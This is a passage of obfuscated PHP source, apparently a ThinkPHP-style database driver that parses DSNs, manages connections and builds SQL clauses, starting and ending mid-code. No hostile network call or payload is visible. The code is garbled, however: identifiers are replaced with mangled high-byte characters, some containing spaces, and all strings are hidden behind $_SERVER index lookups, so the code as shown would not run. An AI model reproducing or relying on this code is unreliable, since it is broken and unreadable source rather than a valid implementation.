"\x53\105\114\105\103\x54\x25\x44\111\123\124\111\116\103\x54\x25\x20\x25\x46\111\105\x4c\x44\45\40\106\122\117\x4d\x20\x25\x54\x41\x42\114\105\x25\x25\112\117\x49\116\x25\45\x57\x48\105\x52\x45\45\45\107\x52\117\x55\120\45\45\110\x41\126\x49\x4e\x47\x25\45\117\122\104\x45\x52\x25\x25\x4c\111\x4d\111\124\x25\40\45\125\x4e\111\117\x4e\x25\x25\x43\117\x4d\x4d\x45\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $äÛ°ÖĞ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[„Ç©ñÎ©][959], $äÛ°ÖĞ); } public function factory($‚¾¾­³˜ = '') { $İ‰·“œÂ =& $_SERVER[„Ç©ñÎ©]; $‚¾¾­³˜ = $this->parseConfig($‚¾¾­³˜); if (empty($‚¾¾­³˜[$İ‰·“œÂ[960]])) { think_exception(think_lang($İ‰·“œÂ[961])); } $this->dbType = ucwords(strtolower($‚¾¾­³˜[$İ‰·“œÂ[960]])); $÷©öô±˜ = $İ‰·“œÂ[962] . $this->dbType; if (class_exists($÷©öô±˜)) { $³†±Ïé« = new $÷©öô±˜($‚¾¾­³˜); if ($İ‰·“œÂ[963] != strtolower($‚¾¾­³˜[$İ‰·“œÂ[960]])) { $³†±Ïé«->dbType = strtoupper($this->dbType); } else { $³†±Ïé«->dbType = $this->_getDsnType($‚¾¾­³˜[$İ‰·“œÂ[915]]); } } else { think_exception(think_lang($İ‰·“œÂ[964]) . $İ‰·“œÂ[965] . $÷©öô±˜); } return $³†±Ïé«; } public function __call($ÊÍ¥©äµ, $×˜ƒ°ıü) { if (method_exists($this, $ÊÍ¥©äµ)) { return call_user_func_array(array($this, $ÊÍ¥©äµ), $×˜ƒ°ıü); } } protected function _getDsnType($ÕÒğµÀı) { $×¿œ‡¾¤ = explode($_SERVER[„Ç©ñÎ©][4], $ÕÒğµÀı); $›œíÖïñ = strtoupper(trim($×¿œ‡¾¤[0])); return $›œíÖïñ; } private function parseConfig($Û®­ù¶ = '') { $Îøåı÷ =& $_SERVER[„Ç©ñÎ©]; if (!empty($Û®­ù¶) && is_string($Û®­ù¶)) { $Û®­ù¶ = $this->parseDSN($Û®­ù¶); } elseif (is_array($Û®­ù¶)) { $Û®­ù¶ = array_change_key_case($Û®­ù¶); $Û®­ù¶ = array($Îøåı÷[960] => $Û®­ù¶[$Îøåı÷[966]], $Îøåı÷[887] => $Û®­ù¶[$Îøåı÷[967]], $Îøåı÷[888] => $Û®­ù¶[$Îøåı÷[968]], $Îøåı÷[885] => $Û®­ù¶[$Îøåı÷[969]], $Îøåı÷[886] => $Û®­ù¶[$Îøåı÷[970]], $Îøåı÷[21] => $Û®­ù¶[$Îøåı÷[971]], $Îøåı÷[915] => $Û®­ù¶[$Îøåı÷[972]], $Îøåı÷[17] => isset($Û®­ù¶[$Îøåı÷[973]]) ? $Û®­ù¶[$Îøåı÷[973]] : array()); } elseif (empty($Û®­ù¶)) { if (think_config($Îøåı÷[974]) && $Îøåı÷[963] != strtolower(think_config($Îøåı÷[975]))) { $Û®­ù¶ = $this->parseDSN(think_config($Îøåı÷[974])); } else { $Û®­ù¶ = array($Îøåı÷[960] => think_config($Îøåı÷[975]), $Îøåı÷[887] => think_config($Îøåı÷[976]), $Îøåı÷[888] => think_config($Îøåı÷[977]), $Îøåı÷[885] => think_config($Îøåı÷[978]), $Îøåı÷[886] => think_config($Îøåı÷[979]), $Îøåı÷[21] => think_config($Îøåı÷[255]), $Îøåı÷[915] => think_config($Îøåı÷[974]), $Îøåı÷[17] => think_config($Îøåı÷[980])); } } return $Û®­ù¶; } protected function initConnect($ÈÑåƒÛ = true) { if (1 == think_config($_SERVER[„Ç©ñÎ©][22])) { $this->_linkID = $this->multiConnect($ÈÑåƒÛ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ö« õ³ê => $›®âÀæç) { $this->_linkID = $›®âÀæç; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($íßÓß«ù = false) { $Îµ› øÈ =& $_SERVER[„Ç©ñÎ©]; static $˜êÀ˜Í¹ = array(); static $¯¯©Ÿ•¹ = -1; if (empty($˜êÀ˜Í¹)) { foreach ($this->config as $”‘ÈŸéÒ => $±î¿Èö) { $˜êÀ˜Í¹[$”‘ÈŸéÒ] = explode($Îµ› øÈ[50], $±î¿Èö); } } if (think_config($Îµ› øÈ[981])) { if ($íßÓß«ù || think_config($Îµ› øÈ[404]) === !0) { $ÏÊß¿À» = floor(mt_rand(0, think_config($Îµ› øÈ[982]) - 1)); $¯¯©Ÿ•¹ = $ÏÊß¿À»; } else { if (is_numeric(think_config($Îµ› øÈ[983]))) { $ÏÊß¿À» = think_config($Îµ› øÈ[983]); } else { $ÏÊß¿À» = floor(mt_rand(think_config($Îµ› øÈ[982]), count($˜êÀ˜Í¹[$Îµ› øÈ[885]]) - 1)); } } } else { $ÏÊß¿À» = floor(mt_rand(0, count($˜êÀ˜Í¹[$Îµ› øÈ[885]]) - 1)); $¯¯©Ÿ•¹ = $ÏÊß¿À»; } $ÏÊß¿À» = $¯¯©Ÿ•¹ !== -1 ? $¯¯©Ÿ•¹ : $ÏÊß¿À»; $¤ı‘»‡ = array($Îµ› øÈ[887] => isset($˜êÀ˜Í¹[$Îµ› øÈ[887]][$ÏÊß¿À»]) ? $˜êÀ˜Í¹[$Îµ› øÈ[887]][$ÏÊß¿À»] : $˜êÀ˜Í¹[$Îµ› øÈ[887]][0], $Îµ› øÈ[888] => isset($˜êÀ˜Í¹[$Îµ› øÈ[888]][$ÏÊß¿À»]) ? $˜êÀ˜Í¹[$Îµ› øÈ[888]][$ÏÊß¿À»] : $˜êÀ˜Í¹[$Îµ› øÈ[888]][0], $Îµ› øÈ[885] => isset($˜êÀ˜Í¹[$Îµ› øÈ[885]][$ÏÊß¿À»]) ? $˜êÀ˜Í¹[$Îµ› øÈ[885]][$ÏÊß¿À»] : $˜êÀ˜Í¹[$Îµ› øÈ[885]][0], $Îµ› øÈ[886] => isset($˜êÀ˜Í¹[$Îµ› øÈ[886]][$ÏÊß¿À»]) ? $˜êÀ˜Í¹[$Îµ› øÈ[886]][$ÏÊß¿À»] : $˜êÀ˜Í¹[$Îµ› øÈ[886]][0], $Îµ› øÈ[21] => isset($˜êÀ˜Í¹[$Îµ› øÈ[21]][$ÏÊß¿À»]) ? $˜êÀ˜Í¹[$Îµ› øÈ[21]][$ÏÊß¿À»] : $˜êÀ˜Í¹[$Îµ› øÈ[21]][0], $Îµ› øÈ[915] => isset($˜êÀ˜Í¹[$Îµ› øÈ[915]][$ÏÊß¿À»]) ? $˜êÀ˜Í¹[$Îµ› øÈ[915]][$ÏÊß¿À»] : $˜êÀ˜Í¹[$Îµ› øÈ[915]][0], $Îµ› øÈ[17] => isset($˜êÀ˜Í¹[$Îµ› øÈ[17]][$ÏÊß¿À»]) ? $˜êÀ˜Í¹[$Îµ› øÈ[17]][$ÏÊß¿À»] : $˜êÀ˜Í¹[$Îµ› øÈ[17]][0]); return $this->connect($¤ı‘»‡, $ÏÊß¿À»); } public function parseDSN($¾ï°ş¶) { $æõ¯Œ±Æ =& $_SERVER[„Ç©ñÎ©]; if (empty($¾ï°ş¶)) { return !1; } $ñ‹à…èÒ = parse_url($¾ï°ş¶); if ($ñ‹à…èÒ[$æõ¯Œ±Æ[190]]) { $’ş‚ä§× = array($æõ¯Œ±Æ[960] => $ñ‹à…èÒ[$æõ¯Œ±Æ[190]], $æõ¯Œ±Æ[887] => isset($ñ‹à…èÒ[$æõ¯Œ±Æ[609]]) ? $ñ‹à…èÒ[$æõ¯Œ±Æ[609]] : $æõ¯Œ±Æ[12], $æõ¯Œ±Æ[888] => isset($ñ‹à…èÒ[$æõ¯Œ±Æ[984]]) ? $ñ‹à…èÒ[$æõ¯Œ±Æ[984]] : $æõ¯Œ±Æ[12], $æõ¯Œ±Æ[885] => isset($ñ‹à…èÒ[$æõ¯Œ±Æ[191]]) ? $ñ‹à…èÒ[$æõ¯Œ±Æ[191]] : $æõ¯Œ±Æ[12], $æõ¯Œ±Æ[886] => isset($ñ‹à…èÒ[$æõ¯Œ±Æ[192]]) ? $ñ‹à…èÒ[$æõ¯Œ±Æ[192]] : $æõ¯Œ±Æ[12], $æõ¯Œ±Æ[21] => isset($ñ‹à…èÒ[$æõ¯Œ±Æ[94]]) ? substr($ñ‹à…èÒ[$æõ¯Œ±Æ[94]], 1) : $æõ¯Œ±Æ[12]); } else { preg_match($æõ¯Œ±Æ[985], trim($¾ï°ş¶), $æ´çµÑò); $’ş‚ä§× = array($æõ¯Œ±Æ[960] => $æ´çµÑò[1], $æõ¯Œ±Æ[887] => $æ´çµÑò[2], $æõ¯Œ±Æ[888] => $æ´çµÑò[3], $æõ¯Œ±Æ[885] => $æ´çµÑò[4], $æõ¯Œ±Æ[886] => $æ´çµÑò[5], $æõ¯Œ±Æ[21] => $æ´çµÑò[6]); } $’ş‚ä§×[$æõ¯Œ±Æ[915]] = $æõ¯Œ±Æ[12]; return $’ş‚ä§×; } protected function debug() { $•å»ƒº =& $_SERVER[„Ç©ñÎ©]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $•å»ƒº[986]; if (think_config($•å»ƒº[987])) { think_status($•å»ƒº[988]); think_trace($this->queryStr . $•å»ƒº[989] . think_status($•å»ƒº[24], $•å»ƒº[988], 6) . $•å»ƒº[990], $•å»ƒº[12], $•å»ƒº[991]); } } protected function parseLock($º»Èå²» = false) { $²ğîåì =& $_SERVER[„Ç©ñÎ©]; if (!$º»Èå²») { return $²ğîåì[12]; } if ($²ğîåì[917] == $this->dbType) { return $²ğîåì[992]; } return $²ğîåì[993]; } protected function parseSet($ƒŸØëò’) { $ÅøŒ× =& $_SERVER[„Ç©ñÎ©]; foreach ($ƒŸØëò’ as $¿Ãì÷ñÃ => $´†œÅ‚û) { if (is_array($´†œÅ‚û) && $ÅøŒ×[306] == $´†œÅ‚û[0]) { $Û¨¢êÖ[] = $this->parseKey($¿Ãì÷ñÃ) . $ÅøŒ×[883] . $´†œÅ‚û[1]; } elseif (is_scalar($´†œÅ‚û) || is_null($´†œÅ‚û)) { $Û¨¢êÖ[] = $this->parseKey($¿Ãì÷ñÃ) . $ÅøŒ×[883] . $this->parseValue($´†œÅ‚û); } } return $ÅøŒ×[994] . implode($ÅøŒ×[50], $Û¨¢êÖ); } protected function bindParam($œ£ÏÌ, $ÁüÓ–Ä) { $this->bind[$_SERVER[„Ç©ñÎ©][4] . $œ£ÏÌ] = $ÁüÓ–Ä; } protected function parseBind($ú¶äùöÔ) { $ú¶äùöÔ = array_merge($this->bind, $ú¶äùöÔ); $this->bind = array(); return $ú¶äùöÔ; } function parseKey(&$°Å›¡¡¤, $Ç¾şêç¼ = true) { if ($Ç¾şêç¼) { $°Å›¡¡¤ = $this->parseKeyCheck($°Å›¡¡¤); } return $°Å›¡¡¤; } function parseKeyCheck($üáãŸ¹¸) { $¹ÙŸù =& $_SERVER[„Ç©ñÎ©]; $üáãŸ¹¸ = trim($üáãŸ¹¸); if (!preg_match($¹ÙŸù[995], $üáãŸ¹¸)) { think_exception($¹ÙŸù[996] . $üáãŸ¹¸); } return $üáãŸ¹¸; } protected function parseValue($çƒÏá“å) { $ùèÕÉ³™ =& $_SERVER[„Ç©ñÎ©]; if (is_string($çƒÏá“å)) { $çƒÏá“å = $ùèÕÉ³™[956] . $this->escapeString($çƒÏá“å) . $ùèÕÉ³™[956]; } elseif (isset($çƒÏá“å[0]) && is_string($çƒÏá“å[0]) && strtolower($çƒÏá“å[0]) == $ùèÕÉ³™[306]) { $çƒÏá“å = $this->escapeString($çƒÏá“å[1]); } elseif (is_array($çƒÏá“å)) { $çƒÏá“å = array_map(array($this, $ùèÕÉ³™[957]), $çƒÏá“å); } elseif (is_bool($çƒÏá“å)) { $çƒÏá“å = $çƒÏá“å ? $ùèÕÉ³™[98] : $ùèÕÉ³™[207]; } elseif (is_null($çƒÏá“å)) { $çƒÏá“å = $ùèÕÉ³™[113]; } return $çƒÏá“å; } protected function parseField($ì£›¬ËŠ) { $Ôûúı—ó =& $_SERVER[„Ç©ñÎ©]; if (is_string($ì£›¬ËŠ) && strpos($ì£›¬ËŠ, $Ôûúı—ó[50])) { $ì£›¬ËŠ = explode($Ôûúı—ó[50], $ì£›¬ËŠ); } if (is_array($ì£›¬ËŠ)) { $éõéˆ¸ = array(); foreach ($ì£›¬ËŠ as $±¾úä© => $şé½ä) { if (!is_numeric($±¾úä©)) { $éõéˆ¸[] = $this->parseKey($±¾úä©, !1) . $Ôûúı—ó[997] . $this->parseKey($şé½ä); } else { $éõéˆ¸[] = $this->parseKey($şé½ä); } } $œªõ¼¬Á = implode($Ôûúı—ó[50], $éõéˆ¸); } elseif (is_string($ì£›¬ËŠ) && !empty($ì£›¬ËŠ)) { $œªõ¼¬Á = $ì£›¬ËŠ; } else { $œªõ¼¬Á = $Ôûúı—ó[198]; } return $œªõ¼¬Á; } protected function parseTable($Ô‘ªî˜ì) { $“›õš‘¯ =& $_SERVER[„Ç©ñÎ©]; if (is_array($Ô‘ªî˜ì)) { $¢ÕÃ˜ñ = array(); foreach ($Ô‘ªî˜ì as $“ËÀØ½ƒ => $®Š¦úÊ) { if (!is_numeric($“ËÀØ½ƒ)) { $¢ÕÃ˜ñ[] = $this->parseKey($“ËÀØ½ƒ) . $“›õš‘¯[53] . $this->parseKey($®Š¦úÊ); } else { $¢ÕÃ˜ñ[] = $this->parseKey($“ËÀØ½ƒ); } } $Ô‘ªî˜ì = $¢ÕÃ˜ñ; } elseif (is_string($Ô‘ªî˜ì)) { if (strstr($Ô‘ªî˜ì, $“›õš‘¯[53])) { return $Ô‘ªî˜ì; } $Ô‘ªî˜ì = explode($“›õš‘¯[50], $Ô‘ªî˜ì); array_walk($Ô‘ªî˜ì, array($this, $“›õš‘¯[905])); } return $“›õš‘¯[899] . trim(implode($“›õš‘¯[998], $Ô‘ªî˜ì), $“›õš‘¯[394]) . $“›õš‘¯[899]; } protected function parseWhere($›šÀ˜¸Ã) { $¯Ñ–«“ =& $_SERVER[„Ç©ñÎ©]; $öõÈ†ä– = $¯Ñ–«“[12]; if (is_string($›šÀ˜¸Ã)) { $öõÈ†ä– = $›šÀ˜¸Ã; } else { $¥·¥†£Ì = isset($›šÀ˜¸Ã[$¯Ñ–«“[999]]) ? strtoupper($›šÀ˜¸Ã[$¯Ñ–«“[999]]) : $¯Ñ–«“[12]; if (in_array($¥·¥†£Ì, array($¯Ñ–«“[1000], $¯Ñ–«“[1001], $¯Ñ–«“[1002]))) { $¥·¥†£Ì = $¯Ñ–«“[53] . $¥·¥†£Ì . $¯Ñ–«“[53]; unset($›šÀ˜¸Ã[$¯Ñ–«“[999]]); } else { $¥·¥†£Ì = $¯Ñ–«“[1003]; } foreach ($›šÀ˜¸Ã as $…Ç‰‰Å => $š´˜É¼Ÿ) { $öõÈ†ä– .= $¯Ñ–«“[286]; if (is_numeric($…Ç‰‰Å)) { $…Ç‰‰Å = $¯Ñ–«“[1004]; } if (0 === strpos($…Ç‰‰Å, $¯Ñ–«“[11])) { $öõÈ†ä– .= $this->parseThinkWhere($…Ç‰‰Å, $š´˜É¼Ÿ); } else { if (!preg_match($¯Ñ–«“[1005], trim($…Ç‰‰Å))) { think_exception(think_lang($¯Ñ–«“[1006]) . $¯Ñ–«“[4] . $…Ç‰‰Å); } $ĞÍ’¥”½ = is_array($š´˜É¼Ÿ) && isset($š´˜É¼Ÿ[$¯Ñ–«“[1007]]); $…Ç‰‰Å = trim($…Ç‰‰Å); if (strpos($…Ç‰‰Å, $¯Ñ–«“[292])) { $’³Ğ’ = explode($¯Ñ–«“[292], $…Ç‰‰Å); $À¦Ïü¨œ = array(); foreach ($’³Ğ’ as $ÇâÀ³¹ø => $ğ™³ûì) { $™ŒÀëÂÎ = $ĞÍ’¥”½ ? $š´˜É¼Ÿ[$ÇâÀ³¹ø] : $š´˜É¼Ÿ; $À¦Ïü¨œ[] = $¯Ñ–«“[269] . $this->parseWhereItem($this->parseKey($ğ™³ûì), $™ŒÀëÂÎ) . $¯Ñ–«“[904]; } $öõÈ†ä– .= implode($¯Ñ–«“[1008], $À¦Ïü¨œ); } elseif (strpos($…Ç‰‰Å, $¯Ñ–«“[293])) { $’³Ğ’ = explode($¯Ñ–«“[293], $…Ç‰‰Å); $À¦Ïü¨œ = array(); foreach ($’³Ğ’ as $ÇâÀ³¹ø => $ğ™³ûì) { $™ŒÀëÂÎ = $ĞÍ’¥”½ ? $š´˜É¼Ÿ[$ÇâÀ³¹ø] : $š´˜É¼Ÿ; $À¦Ïü¨œ[] = $¯Ñ–«“[269] . $this->parseWhereItem($this->parseKey($ğ™³ûì), $™ŒÀëÂÎ) . $¯Ñ–«“[904]; } $öõÈ†ä– .= implode($¯Ñ–«“[1003], $À¦Ïü¨œ); } else { $öõÈ†ä– .= $this->parseWhereItem($this->parseKey($…Ç‰‰Å), $š´˜É¼Ÿ); } } $öõÈ†ä– .= $¯Ñ–«“[287] . $¥·¥†£Ì; } $öõÈ†ä– = substr($öõÈ†ä–, 0, -strlen($¥·¥†£Ì)); } return empty($öõÈ†ä–) ? $¯Ñ–«“[12] : $¯Ñ–«“[1009] . $öõÈ†ä–; } protected function parseWhereItem($ñè‰å²«, $ß€±œ¹) { $„ÎÇı‡  =& $_SERVER[„Ç©ñÎ©]; $µçÁ§®º = $„ÎÇı‡ [12]; if (is_array($ß€±œ¹)) { if (is_string($ß€±œ¹[0])) { $Š„ßöÒ§ = strtolower($ß€±œ¹[0]); if (in_array($ß€±œ¹[0], array($„ÎÇı‡ [883], $„ÎÇı‡ [1010], $„ÎÇı‡ [1011], $„ÎÇı‡ [1012], $„ÎÇı‡ [1013], $„ÎÇı‡ [1014]))) { $µçÁ§®º .= $ñè‰å²« . $„ÎÇı‡ [53] . $ß€±œ¹[0] . $„ÎÇı‡ [53] . $this->parseValue($ß€±œ¹[1]); } elseif (preg_match($„ÎÇı‡ [1015], $ß€±œ¹[0])) { $µçÁ§®º .= $ñè‰å²« . $„ÎÇı‡ [53] . $this->exp[$Š„ßöÒ§] . $„ÎÇı‡ [53] . $this->parseValue($ß€±œ¹[1]); } elseif (preg_match($„ÎÇı‡ [1016], $ß€±œ¹[0])) { if (is_array($ß€±œ¹[1])) { $ëĞî³“¹ = isset($ß€±œ¹[2]) ? strtoupper($ß€±œ¹[2]) : $„ÎÇı‡ [1001]; if (in_array($ëĞî³“¹, array($„ÎÇı‡ [1000], $„ÎÇı‡ [1001], $„ÎÇı‡ [1002]))) { $ı«ë¨²Ê = array(); foreach ($ß€±œ¹[1] as $ÜÓóéŠÌ) { $ı«ë¨²Ê[] = $ñè‰å²« . $„ÎÇı‡ [53] . $this->exp[$Š„ßöÒ§] . $„ÎÇı‡ [53] . $this->parseValue($ÜÓóéŠÌ); } $µçÁ§®º .= $„ÎÇı‡ [269] . implode($„ÎÇı‡ [53] . $ëĞî³“¹ . $„ÎÇı‡ [53], $ı«ë¨²Ê) . $„ÎÇı‡ [904]; } } else { $µçÁ§®º .= $ñè‰å²« . $„ÎÇı‡ [53] . $this->exp[$Š„ßöÒ§] . $„ÎÇı‡ [53] . $this->parseValue($ß€±œ¹[1]); } } elseif ($„ÎÇı‡ [306] == $Š„ßöÒ§) { $µçÁ§®º .= $„ÎÇı‡ [902] . $ñè‰å²« . $„ÎÇı‡ [53] . $ß€±œ¹[1] . $„ÎÇı‡ [1017]; } elseif (preg_match($„ÎÇı‡ [1018], $ß€±œ¹[0])) { $µçÁ§®º .= $ß€±œ¹[0]; } elseif (preg_match($„ÎÇı‡ [1019], $ß€±œ¹[0])) { if (isset($ß€±œ¹[2]) && $„ÎÇı‡ [306] == $ß€±œ¹[2]) { $µçÁ§®º .= $ñè‰å²« . $„ÎÇı‡ [53] . $this->exp[$Š„ßöÒ§] . $„ÎÇı‡ [53] . $ß€±œ¹[1]; } else { if (is_string($ß€±œ¹[1])) { $ß€±œ¹[1] = explode($„ÎÇı‡ [50], $ß€±œ¹[1]); } $°şÒ½¾ = implode($„ÎÇı‡ [50], $this->parseValue($ß€±œ¹[1])); $µçÁ§®º .= $ñè‰å²« . $„ÎÇı‡ [53] . $this->exp[$Š„ßöÒ§] . $„ÎÇı‡ [902] . $°şÒ½¾ . $„ÎÇı‡ [904]; } } elseif (preg_match($„ÎÇı‡ [1020], $ß€±œ¹[0])) { $ÃÇ§‰Ö = is_string($ß€±œ¹[1]) ? explode($„ÎÇı‡ [50], $ß€±œ¹[1]) : $ß€±œ¹[1]; $µçÁ§®º .= $„ÎÇı‡ [902] . $ñè‰å²« . $„ÎÇı‡ [53] . $this->exp[$Š„ßöÒ§] . $„ÎÇı‡ [53] . $this->parseValue($ÃÇ§‰Ö[0]) . $„ÎÇı‡ [1003] . $this->parseValue($ÃÇ§‰Ö[1]) . $„ÎÇı‡ [287]; } else { think_exception(think_lang($„ÎÇı‡ [1006]) . $„ÎÇı‡ [4] . $ß€±œ¹[0]); } } else { $£Ãğ”ıÁ = count($ß€±œ¹); $´ËßÄÆ¬ = $„ÎÇı‡ [12]; if (is_string($ß€±œ¹[$£Ãğ”ıÁ - 1])) { $´ËßÄÆ¬ = isset($ß€±œ¹[$£Ãğ”ıÁ - 1]) ? strtoupper($ß€±œ¹[$£Ãğ”ıÁ - 1]) : $„ÎÇı‡ [12]; if (in_array($´ËßÄÆ¬, array($„ÎÇı‡ [1000], $„ÎÇı‡ [1001], $„ÎÇı‡ [1002]))) { $£Ãğ”ıÁ = $£Ãğ”ıÁ - 1; } } else { $´ËßÄÆ¬ = $„ÎÇı‡ [1000]; } for ($Óì£Ìš¶ = 0; $Óì£Ìš¶ < $£Ãğ”ıÁ; $Óì£Ìš¶++) { $ÃÇ§‰Ö = is_array($ß€±œ¹[$Óì£Ìš¶]) ? $ß€±œ¹[$Óì£Ìš¶][1] : $ß€±œ¹[$Óì£Ìš¶]; if ($„ÎÇı‡ [306] == strtolower($ß€±œ¹[$Óì£Ìš¶][0])) { $µçÁ§®º .= $„ÎÇı‡ [269] . $ñè‰å²« . $„ÎÇı‡ [53] . $ÃÇ§‰Ö . $„ÎÇı‡ [1017] . $´ËßÄÆ¬ . $„ÎÇı‡ [53]; } else { $Ñ‚¬äÈ = is_array($ß€±œ¹[$Óì£Ìš¶]) ? $this->exp[strtolower($ß€±œ¹[$Óì£Ìš¶][0])] : $„ÎÇı‡ [883]; if (!$Ñ‚¬äÈ && is_array($ß€±œ¹[$Óì£Ìš¶]) && in_array($ß€±œ¹[$Óì£Ìš¶][0], array($„ÎÇı‡ [883], $„ÎÇı‡ [1010], $„ÎÇı‡ [1011], $„ÎÇı‡ [1012], $„ÎÇı‡ [1013], $„ÎÇı‡ [1014]))) { $Ñ‚¬äÈ = $ß€±œ¹[$Óì£Ìš¶][0]; } $µçÁ§®º .= $„ÎÇı‡ [269] . $ñè‰å²« . $„ÎÇı‡ [53] . $Ñ‚¬äÈ . $„ÎÇı‡ [53] . $this->parseValue($ÃÇ§‰Ö) . $„ÎÇı‡ [1017] . $´ËßÄÆ¬ . $„ÎÇı‡ [53]; } } $µçÁ§®º = substr($µçÁ§®º, 0, -4); } } else { $µçÁ§®º .= $ñè‰å²« . $„ÎÇı‡ [1021] . $this->parseValue($ß€±œ¹); } return $µçÁ§®º; } protected function parseThinkWhere($˜ããË, $çÂˆ÷…É) { $‹…Ñ«íÛ =& $_SERVER[„Ç©ñÎ©]; $ŸÍ…‘˜ó = $‹…Ñ«íÛ[12]; switch ($˜ããË) { case $‹…Ñ«íÛ[361]: $ŸÍ…‘˜ó = $çÂˆ÷…É; break; case $‹…Ñ«íÛ[1004]: $ŸÍ…‘˜ó = is_string($çÂˆ÷…É) ? $çÂˆ÷…É : substr($this->parseWhere($çÂˆ÷…É), 6); break; case $‹…Ñ«íÛ[1022]: parse_str($çÂˆ÷…É, $‰õèÓÁ˜); if (isset($‰õèÓÁ˜[$‹…Ñ«íÛ[999]])) { $§ÉäŸ®¯ = $‹…Ñ«íÛ[53] . strtoupper($‰õèÓÁ˜[$‹…Ñ«íÛ[999]]) . $‹…Ñ«íÛ[53]; unset($‰õèÓÁ˜[$‹…Ñ«íÛ[999]]); } else { $§ÉäŸ®¯ = $‹…Ñ«íÛ[1003]; } $Ì›™‘ôÅ = array(); foreach ($‰õèÓÁ˜ as $ÈäÍÒ·Û => $üë˜Ï–) { $Ì›™‘ôÅ[] = $this->parseKey($ÈäÍÒ·Û) . $‹…Ñ«íÛ[1021] . $this->parseValue($üë˜Ï–); } $ŸÍ…‘˜ó = implode($§ÉäŸ®¯, $Ì›™‘ôÅ); break; } return $ŸÍ…‘˜ó; } protected function parseLimit($äçìçÃ„) { $õı¸¿òò =& $_SERVER[„Ç©ñÎ©]; return !empty($äçìçÃ„) ? $õı¸¿òò[51] . $äçìçÃ„ . $õı¸¿òò[53] : $õı¸¿òò[12]; } protected function parseJoin($Èâ²§¶¨) { $ÛëÃå–Ş =& $_SERVER[„Ç©ñÎ©]; $Úî®µÖ = $ÛëÃå–Ş[12]; if (!empty($Èâ²§¶¨)) { if (is_array($Èâ²§¶¨)) { foreach ($Èâ²§¶¨ as $œ×™Ç¯â => $‚÷íÀ³) { if (!1 !== stripos($‚÷íÀ³, $ÛëÃå–Ş[1023])) { $Úî®µÖ .= $ÛëÃå–Ş[53] . $‚÷íÀ³; } else { $Úî®µÖ .= $ÛëÃå–Ş[1024] . $‚÷íÀ³; } } } else { $Úî®µÖ .= $ÛëÃå–Ş[1024] . $Èâ²§¶¨; } } $Úî®µÖ = preg_replace($ÛëÃå–Ş[1025], think_config($ÛëÃå–Ş[929]) . $ÛëÃå–Ş[1026], $Úî®µÖ); return $Úî®µÖ; } protected function parseOrder($îìşîó) { $™¡ŞÒé– =& $_SERVER[„Ç©ñÎ©]; if (is_array($îìşîó)) { $®´¥¿€  = array(); foreach ($îìşîó as $ô±Ëôìä => $º©ÖÙ©­) { if (is_numeric($ô±Ëôìä)) { $®´¥¿€ [] = $this->parseKey($º©ÖÙ©­); } else { $º©ÖÙ©­ = in_array(strtoupper(trim($º©ÖÙ©­)), array($™¡ŞÒé–[1027], $™¡ŞÒé–[1028])) ? $™¡ŞÒé–[53] . $º©ÖÙ©­ : $™¡ŞÒé–[12]; if (preg_match($™¡ŞÒé–[1029], $ô±Ëôìä)) { $®´¥¿€ [] = $this->parseKey($ô±Ëôìä) . $º©ÖÙ©­; } else { think_exception($™¡ŞÒé–[1030] . $ô±Ëôìä); } } } $îìşîó = implode($™¡ŞÒé–[50], $®´¥¿€ ); } return !empty($îìşîó) ? $™¡ŞÒé–[1031] . $îìşîó : $™¡ŞÒé–[12]; } protected function parseGroup($·¼›Ö) { $°ÏæöÓÒ =& $_SERVER[„Ç©ñÎ©]; return !empty($·¼›Ö) ? $°ÏæöÓÒ[1032] . $·¼›Ö : $°ÏæöÓÒ[12]; } protected function parseHaving($Ü˜‹É—ƒ) { $ùÍŞó† =& $_SERVER[„Ç©ñÎ©]; return !empty($Ü˜‹É—ƒ) ? $ùÍŞó†[1033] . $Ü˜‹É—ƒ : $ùÍŞó†[12]; } protected function parseComment($ø¦‚·˜ä) { $®¦¯×Ê° =& $_SERVER[„Ç©ñÎ©]; return !empty($ø¦‚·˜ä) ? $®¦¯×Ê°[1034] . $ø¦‚·˜ä . $®¦¯×Ê°[1035] : $®¦¯×Ê°[12]; } protected function parseDistinct($‘ßö›…ì) { $›ˆ™²Æ =& $_SERVER[„Ç©ñÎ©]; return !empty($‘ßö›…ì) ? $›ˆ™²Æ[1036] : $›ˆ™²Æ[12]; } protected function parseUnion($ôëšâÖ—) { $À´½ã” =& $_SERVER[„Ç©ñÎ©]; if (empty($ôëšâÖ—)) { return $À´½ã”[12]; } if (isset($ôëšâÖ—[$À´½ã”[357]])) { $ê‘ÉµÉß = $À´½ã”[1037]; unset($ôëšâÖ—[$À´½ã”[357]]); } else { $ê‘ÉµÉß = $À´½ã”[1038]; } foreach ($ôëšâÖ— as $³ãæùÎ¾) { $±ÉÛË·à[] = $ê‘ÉµÉß . (is_array($³ãæùÎ¾) ? $this->buildSelectSql($³ãæùÎ¾) : $³ãæùÎ¾); } return implode($À´½ã”[53], $±ÉÛË·à); } public function insert($Äñ‚ä­©, $–†û€ê² = array(), $Á™ú“—¾ = false) { $å–„¹ãÅ =& $_SERVER[„Ç©ñÎ©]; $æÙÆ Î = $­ƒ—¬ë˜ = array(); $this->model = $–†û€ê²[$å–„¹ãÅ[290]]; foreach ($Äñ‚ä­© as $®Ü€€ => $Ê£ê‹Á‡) { if (is_array($Ê£ê‹Á‡) && $å–„¹ãÅ[306] == $Ê£ê‹Á‡[0]) { $­ƒ—¬ë˜[] = $this->parseKey($®Ü€€); $æÙÆ Î[] = $Ê£ê‹Á‡[1]; } elseif (is_scalar($Ê£ê‹Á‡) || is_null($Ê£ê‹Á‡)) { $­ƒ—¬ë˜[] = $this->parseKey($®Ü€€); $æÙÆ Î[] = $this->parseValue($Ê£ê‹Á‡); } } $ÛûşÌÓ¶ = ($Á™ú“—¾ ? $å–„¹ãÅ[906] : $å–„¹ãÅ[907]) . $å–„¹ãÅ[908] . $this->parseTable($–†û€ê²[$å–„¹ãÅ[288]]) . $å–„¹ãÅ[902] . implode($å–„¹ãÅ[50], $­ƒ—¬ë˜) . $å–„¹ãÅ[903] . implode($å–„¹ãÅ[50], $æÙÆ Î) . $å–„¹ãÅ[904]; $ÛûşÌÓ¶ .= 